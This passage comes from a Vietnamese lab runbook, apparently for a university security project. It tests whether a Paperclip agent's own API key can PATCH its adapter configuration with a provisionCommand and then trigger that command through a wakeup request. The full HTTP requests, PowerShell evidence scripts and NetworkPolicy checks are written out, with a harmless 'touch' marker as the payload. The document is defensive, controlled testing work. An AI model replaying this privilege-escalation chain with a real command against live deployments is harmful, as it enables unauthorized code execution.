   **Project** = `Ch3 Agent-key workspace evidence`. Giữ Priority mặc định
   `Medium` hoặc không đặt priority.
5. **Chụp Paperclip-09** trước khi bấm Create: title, Project và Assignee phải
   cùng nằm trong một khung hình.
6. Bấm **Create Issue**. Trang chi tiết Issue sẽ mở hoặc Issue xuất hiện trong
   danh sách. Xác nhận mã ngay trước title là **`CHB-1`**, Project/Assignee ở
   panel bên phải là đúng, rồi chụp **Paperclip-10**. Nếu mã không phải
   `CHB-1`, không đổi caption; ghi đúng mã do UI tạo và ghi nguyên nhân có
   Issue tồn tại từ trước.

### 3.3. Chạy luồng nghiệp vụ hợp lệ bằng Board UI

1. Trở lại Agent `Ch3 Agent key scope`. Trên header bấm **Run Heartbeat** một
   lần. Nút này dùng phiên Board/operator hiện tại, không dùng Agent API key.
2. Khi hệ thống chuyển sang trang Runs, chọn run mới nhất ở cột trái và chờ
   trạng thái cuối là **succeeded**. Output phải có chuỗi
   `LAB_LOCAL_ADAPTER_COMPLETED`.
3. Chụp **Paperclip-11** gồm tên Agent, run-id/thời điểm, `succeeded` và dòng
   output. Đây là business control: cấu hình Process hợp lệ chạy được bằng
   fixture local, không gọi Claude, Codex, GitHub hay OpenAI.
4. Nếu Agent bị pause, bấm **Resume**, rồi quay lại bước 1. Nếu run failed,
   dừng tại đây và chụp lỗi; không làm PoC Agent API key trước khi baseline
   hợp lệ chạy thành công.
5. Mở lại tab **Configuration**, bật Burp **Proxy > HTTP history**, refresh
   trang một lần và tìm `GET /api/agents/<agent-id>?companyId=<company-id>`.
   Nhấp phải request này > **Send to Repeater**. Request GET/cookie Board là
   đối chứng operator để lấy UUID chính xác; nó chưa là PoC.

### 3.4. Đối chứng principal bằng General Agent B

Thực hiện đối chứng này trước khi sửa `provisionCommand` của A. Nó vừa xác
nhận key B hoạt động, vừa kiểm tra ranh giới self-update/other-agent update.

1. Mở **Configuration** của B, tạo API key tên `ch3-general-b-control`; chỉ
   copy token tạm vào Burp, không chụp hay lưu token.
2. Từ Board UI, refresh Configuration của B rồi đưa `GET
   /api/agents/<agent-b-id>?companyId=<company-id>` sang Repeater. Bỏ
   `If-None-Match` nếu có để response chứa JSON. Ghi lại nguyên
   `adapterType` và `adapterConfig` của B; PATCH `adapterConfig` là thay thế
   object, không gửi object con rút gọn. Dùng **đúng agent reference ở URL của
   GET này** cho PATCH (ví dụ `ch3-general-control-b` trong UI hiện tại). Nó
   có thể là slug của UI; không tự đổi sang một giá trị khác. UUID thật vẫn có
   trong field `id` của JSON để lưu bằng chứng.
3. Gửi request **B → B** chuẩn dưới đây. Không có Cookie Board; chỉ có Bearer
   key B. Dùng đúng `adapterConfig` từ GET B; body mẫu này đúng với B được tạo
   ở Mục 3.2.3 và cố ý không có `provisionCommand`.

   ~~~http
   PATCH /api/agents/<agent-b-id>?companyId=<company-id> HTTP/1.1
   Host: 127.0.0.1:19310
   Accept: application/json
   Content-Type: application/json
   Authorization: Bearer <agent-b-api-key>
   Connection: close

   {
     "adapterType": "process",
     "adapterConfig": {
       "cwd": "/workspace/repo",
       "command": "/paperclip/lab-fixtures/paperclip-local-success",
       "args": [],
       "timeoutSec": 5
     }
   }
   ~~~

   **Không thêm `X-Paperclip-Run-Id: CH3-PAPERCLIP-L1-001`.** Header này chỉ
   nhận UUID của một heartbeat Paperclip đã tồn tại; mã Run của báo cáo là mã
   quản lý evidence, không phải heartbeat UUID. Nếu gửi mã `CH3-...`, server
   sẽ trả `500 invalid input syntax for type uuid`. Theo dõi Run của báo cáo
   bằng thư mục evidence và `-RunId` của script, không bằng header này.

   Expected: HTTP `200` và body `id` đúng agent B. Gửi lại GET B qua Board UI
   để xác nhận config hợp lệ vẫn được lưu.
4. Lấy GET Configuration của A trước phép thử, copy toàn bộ `adapterConfig`
   vào body dưới đây và **chỉ** đổi `timeoutSec` từ `5` thành `6`. Không gửi
   PATCH với chỉ `{ "timeoutSec": 6 }`, vì server sẽ thay toàn bộ object
   `adapterConfig` nếu request được chấp nhận.

   ~~~http
   PATCH /api/agents/<agent-a-id>?companyId=<company-id> HTTP/1.1
   Host: 127.0.0.1:19310
   Accept: application/json
   Content-Type: application/json
   Authorization: Bearer <agent-b-api-key>
   Connection: close

   {
     "adapterType": "process",
     "adapterConfig": {
       "cwd": "/workspace/repo",
       "command": "/paperclip/lab-fixtures/paperclip-local-success",
       "args": [],
       "timeoutSec": 6
     }
   }
   ~~~

   Nếu GET A trước thử nghiệm có field bổ sung, ví dụ `workspaceStrategy`,
   giữ nguyên field đó trong body; chỉ thay `timeoutSec`.
5. Lưu response cross-agent rồi refresh GET A qua Board UI. Kết quả đúng là
   request bị từ chối và `adapterConfig` A không đổi so với GET trước phép thử.
6. Kết quả đủ là request cross-agent bị từ chối **và** A vẫn giữ nguyên cấu
   hình ban đầu. Nếu A đổi cấu hình hoặc server coi B là Board, dừng L1/L2;
   không diễn giải A PATCH sau đó là privilege escalation.

Không đưa raw key B vào Burp export/ảnh. Khi đối chứng đã xong, revoke key B
hoặc revoke cùng A sau toàn bộ run.

### 3.5. Tạo Agent A API key, T0 và gửi PATCH ở Burp Repeater

> **Quy tắc định danh ở toàn bộ mục này:** `agent-id`/agent reference trên
> request target là của **Agent A — `Ch3 Agent key scope`**; Bearer token cũng
> là API key vừa tạo cho **A**; `company-id` là Company chung. Agent B và key B
> chỉ dùng ở Mục 3.4 làm đối chứng và không xuất hiện trong PATCH này.

1. Trở lại **Configuration** của Agent A `Ch3 Agent key scope`, cuộn đến
   **API Keys**.
2. Ở `Key name (e.g. production)`, nhập `ch3-agent-key-boundary-test` và bấm
   **Create**.
3. Paperclip chỉ hiển thị giá trị token đúng một lần. Copy token sang một
   notepad tạm thời; sau đó bấm icon con mắt để ẩn hoặc **Dismiss** banner.
   **Không chụp token, không đưa token vào Markdown/evidence/báo cáo.**
4. Trong Burp, mở tab **Repeater** chứa GET đã gửi từ bước 3.3. Đổi method
   thành `PATCH`; giữ nguyên request-target có `agent-id` và `companyId`, cùng
   header `Host: 127.0.0.1:19310`.
5. Xóa toàn bộ header `Cookie`. Thêm duy nhất header nhận diện principal:

   ~~~http
   Authorization: Bearer <dán-agent-api-key-vừa-copy>
   ~~~

6. Thay JSON body bằng payload marker vô hại sau. Chỉ thay hai placeholder
   trên dòng request; không thay path `/workspace/repo` trong JSON:

   ~~~http
   PATCH /api/agents/<agent-id>?companyId=<company-id> HTTP/1.1
   Host: 127.0.0.1:19310
   Content-Type: application/json
   Authorization: Bearer <agent-api-key>

   {
     "adapterType": "process",
     "adapterConfig": {
       "cwd": "/workspace/repo",
       "command": "/paperclip/lab-fixtures/paperclip-local-success",
       "args": [],
       "timeoutSec": 5,
       "workspaceStrategy": {
         "type": "git_worktree",
         "branchTemplate": "ch3-agent-key-evidence",
         "provisionCommand": "touch /workspace/repo/.paperclip/lab-agent-key-scope-marker"
       }
     }
   }
   ~~~

7. Trước khi bấm **Send**, đo T0 (marker phải absent):

   ~~~powershell
   .\scripts\44-check-paperclip-scope-marker.ps1 `
     -CampaignId $Campaign -RunId $Run `
     -Checkpoint T0 `
     -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
   ~~~

   Script này không gọi API Paperclip bằng Agent key và không tạo/xóa marker.
   Nó chỉ dùng quyền quan sát Kubernetes để kiểm tra sự hiện diện của file
   marker trong Pod `paperclip-exposed`, rồi lưu kết quả `markerPresent: false`
   cùng Pod UID, image và thời điểm vào thư mục `EvidenceRoot`. T0 là mốc
   chứng minh marker chưa tồn tại **trước** PATCH và trước run; về sau T1/T2
   giúp liên kết tác động với đúng lượt chạy, thay vì nhầm file tồn dư từ lượt
   cũ thành kết quả PoC.

8. Bấm **Send**. Với Paperclip v0.3.1 đang chạy trong lab, expected result là
   **HTTP 200**. Ngay trong Burp, che riêng giá trị sau `Bearer ` rồi chụp
   **Paperclip-12**: method, path, JSON chứa `provisionCommand`, `200` và body
   response phải còn đọc được. Một ảnh HTTP 200 đơn lẻ chỉ chứng minh server
   chấp nhận thay đổi; chưa chứng minh command đã chạy.

9. Gửi GET Agent A bằng cùng `companyId` để xác nhận server đã lưu
   `adapterConfig.workspaceStrategy.provisionCommand`. Sau đó đo T1, vẫn phải
   absent; PATCH lưu cấu hình nhưng không được tự tạo marker:

   ~~~powershell
   .\scripts\44-check-paperclip-scope-marker.ps1 `
     -CampaignId $Campaign -RunId $Run `
     -Checkpoint T1 `
     -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
   ~~~

### 3.6. Phân biệt Run Heartbeat trên UI với wakeup có ngữ cảnh Issue

Nút **Run Heartbeat** trên trang Agent gọi đúng endpoint dưới đây. Nó là bước
baseline ở Mục 3.3, và không có `issueId` trong request:

~~~http
POST /api/agents/<agent-id>/heartbeat/invoke?companyId=<company-id>
~~~

Vì không có Issue/Project, server hợp lệ sử dụng workspace fallback kiểu
`/instances/default/workspaces/<agent-id>`. Do đó request UI này không phải
request để chứng minh marker worktree: nếu dùng nó sau PATCH, marker có thể
vẫn `False` hoặc run fail ở bước `git rev-parse`. Đây không phải bằng chứng
rằng PATCH đã bị từ chối.

> **Lỗi đã gặp trong lần làm trước — không lặp lại.** Sau khi PATCH trả `200`,
> đã copy request của nút **Run Heartbeat**, thay Cookie bằng Agent API key và
> gửi lại request sau:
>
> ~~~http
> POST /api/agents/<agent-id>/heartbeat/invoke?companyId=<company-id>
> Content-Type: application/json
> Authorization: Bearer <agent-api-key>
>
> {}
> ~~~
>
> Request này có thể trả `202 Accepted`, nhưng `202` chỉ nói run đã được nhận/
> xếp hàng. Body `{}` không mang `issueId`; response run vì thế chỉ có các
> trường ngữ cảnh như `triggeredBy`, `actorId`, `wakeSource` và
> `wakeTriggerDetail`, **không có `issueId` hoặc Project**. Server không thể
> suy ra `/workspace/repo`, nên dùng fallback workspace. Khi `adapterConfig`
> đã có `workspaceStrategy.type = git_worktree`, provision command chỉ có thể
> chạy sau khi server xác định được một Git base workspace; fallback không đáp
> ứng điều kiện đó. Vì vậy `markerPresent : False` là kết quả phù hợp với
> request sai ngữ cảnh, không phải lỗi của script 44 và cũng không phủ định
> PATCH 200.
>
> Không chạy script 44 ngay khi response còn `status: "queued"` hoặc
> `status: "running"`. Script chỉ thực hiện `test -f` trong container
> `paperclip-exposed`; nó không tạo marker, không chờ run và không đọc nội dung
> marker. Phải chờ run kết thúc `succeeded` rồi mới kiểm tra. Nếu log còn dòng
> `No project or prior session workspace was available`, dừng: đây là bằng
> chứng đang dùng fallback và không được chụp kết luận PoC thành công.
>
> **Trình tự làm lại sau lỗi này:** (1) giữ ảnh baseline UI Run Heartbeat ở
> Mục 3.3 làm evidence nghiệp vụ, nhưng không kỳ vọng marker; (2) xác nhận
> PATCH Agent API key ở Mục 3.5 vẫn trả 200; (3) lấy UUID Issue, không dùng
> nhãn `CHB-1`; (4) gọi `/wakeup` có `payload.issueId` theo bước 3 bên dưới;
> (5) chờ run có run-id đó `succeeded`; (6) kiểm tra log không có fallback;
> (7) mới chạy script 44; (8) chỉ khi nó in `markerPresent : True` mới chụp
> Paperclip-15. Nếu Pod Paperclip đã bị xóa/recreate thì các `emptyDir` đã mất:
> dựng lại Company/Project/Agent/Issue, PATCH và wakeup trong Pod mới; không
> dùng lại run hay marker của Pod cũ.

Đừng nhầm nó với request chỉ đọc lịch sử sau đây; GET này không tạo run:

~~~http
GET /api/companies/<company-id>/heartbeat-runs?agentId=<agent-id>
~~~

Để theo đuổi **L2**, dùng **cùng Agent API key** và endpoint `wakeup` với
`payload.issueId`. Server khi đó tra Project của Issue và chọn local workspace
`/workspace/repo` trước khi hiện thực hoá `git_worktree`.

Nếu PATCH của A đã được chứng minh nhưng wakeup Agent không được xử lý dưới
principal A, có thể đo **L1** bằng trigger Board: lấy request Board từ UI,
giữ Cookie Board trong Burp nhưng không chụp cookie, đổi nó thành
`POST /api/agents/<agent-id>/wakeup?companyId=<company-id>` với cùng
`payload.issueId`. Caption phải nói rõ Board kích hoạt run. Không thay L1 bằng
`heartbeat/invoke`, vì endpoint đó không có ngữ cảnh Issue/Project.

1. Lấy UUID thật của Issue. Trong Burp HTTP history, refresh trang Issues và
   mở response của request sau:

   ~~~http
   GET /api/companies/<company-id>/issues
   ~~~

   Trong JSON response, tìm object có `identifier` là `CHB-1` (hoặc mã Issue
   thực tế ở bước 3.2.5), rồi copy trường `id` UUID của **chính object đó**.
   Gọi nó là `<issue-id>`. Không dùng chuỗi hiển thị `CHB-1` thay cho UUID.
2. Bảo đảm không có run nào của Issue còn `queued` hoặc `running`: vào Agent
   > Runs và chờ run cũ kết thúc. Khi có run đang chạy, Paperclip có thể defer
   request mới để tránh hai agent cùng thực thi một Issue.
3. Trong Burp Repeater, tạo request dưới đây cho L2. Thay đúng ba placeholder
   trên request/body. Không đổi `/workspace/repo` trong PATCH của Mục 3.5 và
   không gửi Cookie Board; `Authorization` là Agent API key vừa tạo.

   ~~~http
   POST /api/agents/<agent-id>/wakeup?companyId=<company-id> HTTP/1.1
   Host: 127.0.0.1:19310
   Content-Type: application/json
   Authorization: Bearer <agent-api-key>
   Connection: close

   {
     "source": "on_demand",
     "triggerDetail": "manual",
     "reason": "chapter3-agent-key-boundary-evidence",
     "payload": {
       "issueId": "<issue-id>"
     },
     "idempotencyKey": "ch3-marker-001"
   }
   ~~~

4. Bấm **Send**. Expected response là **202 Accepted** có object run (trong
   đó có `id`). Che riêng giá trị Bearer rồi chụp **Paperclip-13**: phải thấy
   `POST /wakeup`, `payload.issueId`, HTTP 202 và run-id. Đây là request L2;
   `POST /heartbeat/invoke` ở UI vẫn là evidence baseline, không thay thế nó.
   Nếu gửi lại request để tạo một lần chạy mới, đổi `idempotencyKey` thành một
   giá trị mới, chẳng hạn `ch3-marker-002`; giữ nguyên key cũ có thể chỉ trả
   lại kết quả của request trước.
5. Quay lại tab **Runs** của Agent, refresh và mở run có run-id vừa nhận. Chờ
   **succeeded**. Run đúng phải không còn cảnh báo `No project or prior
   session workspace was available`; invocation/workspace phải gắn với Issue
   đã tạo. Chụp **Paperclip-14** gồm run-id/thời điểm và trạng thái cuối.
6. **Lưu final status và log của chính run-id đó trước khi đo T2.** Đây là
   evidence còn thiếu nếu chỉ có response `202` và marker. Trong Burp Repeater,
   dùng cùng principal đã tạo wakeup và thay `<paperclip-run-id>` bằng trường
   `id` nhận ở response `202`:

   ~~~http
   GET /api/heartbeat-runs/<paperclip-run-id> HTTP/1.1
   Host: 127.0.0.1:19310
   Accept: application/json
   Authorization: Bearer <agent-a-api-key>
   ~~~

   ~~~http
   GET /api/heartbeat-runs/<paperclip-run-id>/events?afterSeq=0&limit=200 HTTP/1.1
   Host: 127.0.0.1:19310
   Accept: application/json
   Authorization: Bearer <agent-a-api-key>
   ~~~

   ~~~http
   GET /api/heartbeat-runs/<paperclip-run-id>/log?offset=0&limitBytes=262144 HTTP/1.1
   Host: 127.0.0.1:19310
   Accept: application/json
   Authorization: Bearer <agent-a-api-key>
   ~~~

   Lưu **response body** của ba request thành artifact riêng, không lưu request
   có Bearer thô. Điều kiện đạt là: status cuối `succeeded`, ID trùng response
   wakeup, event/log gắn với run đó, và không có dòng fallback `No project or
   prior session workspace was available` hoặc đường dẫn
   `/instances/default/workspaces/...`. Nếu không lấy được final status/log,
   kết quả dừng ở PATCH + marker quan sát được, chưa gọi là chuỗi end-to-end.
7. Trong PowerShell, chạy kiểm tra marker chỉ-đọc:

   ~~~powershell
   Set-Location D:\daihoc\Nam4\Doan\lab
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint T2 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
   ~~~

8. Chỉ chụp **Paperclip-15** khi T0/T1 có `markerPresent : False`, T2 có
   `markerPresent : True`, marker path
   `/workspace/repo/.paperclip/lab-agent-key-scope-marker`, và execution
   identity `uid=1000 ...`. Kết hợp run-id, Issue UUID, log provisioning và
   T2 trong **cùng Pod UID**. Nếu wakeup được Board kích hoạt, caption phải nói
   rõ đây là L1; chỉ ghi L2 khi cả PATCH/wakeup có evidence Agent A.

   Marker chỉ nằm trong workspace
   `emptyDir` của Pod; không phải host/node/Docker/Kubernetes API access.

9. Nếu output là `markerPresent : False`, không ghi là PoC thành công. Đối
   chiếu theo thứ tự: (a) run có dùng `wakeup` và `payload.issueId` UUID chứ
   không phải `heartbeat/invoke`; (b) run cuối `succeeded`; (c) log không có
   fallback `/instances/default/workspaces/...`; (d) Pod chưa bị recreate;
   (e) T0/T1/T2 cùng Run ID. `/workspace/repo/.paperclip` là `emptyDir`, nên
   marker bị mất khi Pod bị xóa/recreate hoặc cluster được làm mới; khi đó phải
   dựng lại dữ liệu rồi lặp lại PATCH và request wakeup trong cùng Pod.
10. Sau khi ảnh đã được lưu, vào **Agent > Configuration > API Keys**, tìm
   `ch3-agent-key-boundary-test` và bấm **Revoke**. Revoke ngăn tái sử dụng
   token, không xóa marker hay run đã ghi nhận.

### 3.7. Cặp ảnh và caption cho báo cáo

| Ảnh | Phải thấy | Caption ngắn, đúng phạm vi |
|---|---|---|
| Paperclip-01/02 | Wizard Company và CEO Process | Thiết lập bối cảnh quản trị cục bộ, không phải PoC |
| Paperclip-04/06/09 | Project, General Agent, Issue `CHB-1` | Luồng nghiệp vụ có Project, workspace và Agent rõ ràng |
| Paperclip-06B | General Agent B self-update thành công, cross-update A bị từ chối | Đối chứng key hợp lệ được nhận diện là agent và bị giới hạn theo bản ghi đích |
| Paperclip-08 | Process config UI, không có `provisionCommand` | UI operator không expose trường nhạy cảm |
| Paperclip-11 | Board run succeeded + `LAB_LOCAL_ADAPTER_COMPLETED` | Baseline Process hợp lệ chạy thành công |
| Paperclip-12 | Agent A PATCH, `provisionCommand`, GET xác nhận đã lưu, T0/T1 false | Agent-controlled configuration được lưu nhưng chưa tự gây marker |
| Paperclip-13/14/15 | wakeup có `payload.issueId`, run/log provisioning, T2 true | Trigger đã biết dẫn tới marker trong workspace Pod; ghi rõ L1 hoặc L2 theo principal thực tế |

## 4. NetworkPolicy — phép đo allow / block / control

### 4.0. Dùng Phase A chung, nhưng capture NetworkPolicy là evidence riêng

NetworkPolicy chạy **sau Beifong và trước GitHub G3** trong Phase A ở Mục
0.2; không reset lại.

**N1 — baseline NetworkPolicy riêng.** Sau khi B6 hoàn tất, đặt Run
NetworkPolicy và tạo baseline riêng:

~~~powershell
$Run = 'CH3-NETPOL-002'
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
~~~

**N2 — đo từ đúng Pod được policy chọn.** Chạy script 43:

~~~powershell

.\scripts\43-test-github-mcp-networkpolicy.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

Script 43 chỉ thực hiện GET nội bộ, không dùng credential và không tạo sink
event.

**N3 — đọc đúng kết quả.** Mở
`k8s\github-mcp-networkpolicy-measurement.json`. Pattern chỉ xác nhận
enforcement khi đồng thời có:

- `allowSinkFromSelectedGithubPod.ok = true`;
- `targetHealth.endpointReady = 1` và control từ Pod Beifong thành công;
- `blockBeifongFromSelectedGithubPod.ok = false`;
- `observedPatternMatchesPolicy = true`.

Không suy ra NetworkPolicy có hiệu lực chỉ từ YAML, HTTP `401/403`, hoặc một
timeout đơn lẻ. Phép đo phải dùng đúng Pod `github-mcp-exposed` đang bị
selector policy chọn, một Service ngoài allow-list có endpoint sống, và một
Pod control không bị selector chọn.

**N4 — seal NetworkPolicy Run.** Chụp JSON measurement cùng
`runtime-baseline.json`, rồi chạy:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run
~~~

Sau N4 có thể chuyển ngay sang baseline G3 trong Mục 0.2. Nếu baseline
NetworkPolicy không đạt `-RequireClean`, dừng và reset theo Mục 0.3, không bỏ
qua trạng thái còn sót. Nếu pattern không đạt, không sửa CNI/manifest để ép
kết quả; ghi chính xác policy mới được quan sát ở mức khai báo hoặc CNI/runtime
chưa xác nhận cưỡng chế.

## 5. Bảng điều kiện hoàn thành

| Trường hợp | Điều kiện đủ trong lab | Không được kết luận |
|---|---|---|
| Beifong | business download hợp lệ; response canary xác nhận body; inventory cùng Run ID xác nhận scope Pod | đọc host file, secret thật hoặc quyền cluster |
| GitHub MCP | B blank; fallback; fingerprint A=B; sink event; process identity G3 không đổi | GitHub/OpenAI/MCP thật nhận credential |
| Paperclip L1 | B self/cross control đạt; A PATCH lưu config; T0/T1 false; run/log; T2 true | agent tự kích hoạt toàn chuỗi, node/Docker/Kubernetes API access |
| Paperclip L2 | toàn bộ L1 và cả PATCH/wakeup được đối chiếu là Agent A | host command execution hoặc quyền cluster |
| NetworkPolicy | allow + block + control Pod, target sống và CNI được ghi nhận | policy được cưỡng chế chỉ từ YAML/timeout đơn lẻ |

Các JSON trong evidence và ảnh chụp phải gắn cùng **Campaign ID + Run ID**,
Pod UID/imageID khi cần, agent-id/run-id hoặc eventId. Nếu business control
thất bại, dừng tại đó, giữ ảnh lỗi và sửa cấu hình trước khi chạy PoC; không
ghi một HTTP status đơn lẻ thành kết luận bảo mật.
